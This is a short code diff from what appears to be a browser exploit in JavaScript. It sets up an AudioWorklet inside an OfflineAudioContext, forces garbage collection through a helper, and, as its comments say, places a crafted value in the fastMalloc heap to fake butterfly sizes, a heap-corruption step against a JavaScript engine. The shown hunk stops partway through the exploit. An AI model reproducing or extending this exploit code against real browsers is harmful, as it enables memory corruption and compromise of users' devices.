@@ -14,11 +14,12 @@
         log("starting...")
         var context = new OfflineAudioContext(1, 128, 300000);
         context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
+        gc1();
         registerProcessor("a", class {
             constructor() {
               // setup a message port to the main thread
               port = new AudioWorkletProcessor().port;
-              port.onmessage = gc;
+              port.onmessage = gc1;
 
               // this part is magic
               // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
